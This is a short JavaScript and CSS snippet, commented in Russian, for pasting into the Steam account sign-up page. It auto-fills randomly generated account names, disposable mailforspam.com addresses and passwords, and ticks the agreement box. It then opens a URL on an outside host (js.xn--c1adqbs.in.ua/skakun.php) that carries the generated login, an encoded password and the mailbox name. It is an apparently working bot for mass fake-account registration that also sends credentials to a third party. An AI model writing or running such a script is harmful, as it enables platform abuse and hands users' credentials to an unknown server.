/*
Этот скрипт для сайта - https://store.steampowered.com/join
///*///

// Для вставки в поле - JS

var version=2,
min=[100, 48, 95,  47, 95,  47, 95],n=['accountname','email','reenter_email','password','reenter_password'],
max=[122, 57, 122, 57, 122, 57, 122],kol=[11, 9, 9, 11],w='',u=[],ht='http://js.xn--c1adqbs.in.ua/skakun.php?a=',
st='', sn=0, sa='http://js.xn--c1adqbs.in.ua';en=document.getElementById('main_content');
if(en){st=document.getElementById('main_content').textContent;
sn=st.indexOf('Чтобы завершить создание аккаунта Steam, вернитесь к окну регистрации');
if(sn>0){window.open(sa);window.close();}}
function Rnd(min, max){return Math.floor(Math.random()*(max-min+1))+min}
function Chr(i){1==i?i=0:i=Rnd(0,6);z=Rnd(min[i], max[i]);if(96==z||47==z)z=95;return String.fromCharCode(z);}
function Cre(t){for(var z='', i=1, j=1; i<=t; i++, j=i){if(j==t)j=1;z+=Chr(j);}return z;}
function CrP(a){for(var z='', k=['', ''], i=1, j=1; i<=a; i++, j=i){if(j==a)j=1;1==j?j=0:j=Rnd(0,6);
z=Rnd(min[j], max[j]);if(96==z||47==z)z=95;k[0]+=String.fromCharCode(z);k[1]+=(z<100?'0':'')+z;}return k;}
function Chz(d){var c=['',''];z=Rnd(min[d],max[d]);if(96==z||47==z)z=95;c[0]+=String.fromCharCode(z);
c[1]+=(z<100?'0':'')+z;return c;}for(var i=0; i<4; i++){if(3==i){for(var b=1; b<6; min.pop(), max.pop(), b++){}
min.push(58, 33, 44, 94, 63, 65); max.push(59, 34, 46, 96, 90, 90);}
3==i?k=CrP(kol[i]):u[i]=Cre(kol[i]);if(2==i){w=u[i];u[i-1]=u[i]+='@mailforspam.com';}}
u[3]=k[0];(c=Chz(7))&&(u[3]+=c[0])&&(k[1]+=c[1]);(c=Chz(4))&&(u[3]+=c[0])&&(k[1]+=c[1]);
(c=Chz(0))&&(u[3]+=c[0])&&(k[1]+=c[1]);(c=Chz(1))&&(u[3]+=c[0])&&(k[1]+=c[1]);u[4]=u[3];
u[3]+='12';for(var i=0; i<5; i++){document.getElementById(n[i]).value=u[i];}ht+=u[0]+'&p='+version;
document.getElementById('i_agree_check').checked=true;window.open(ht+k[1]+'&m='+w);





// Для вставки в поле - CSS
#createAccountButton
{position:absolute;
top:470px;
left:265px;}
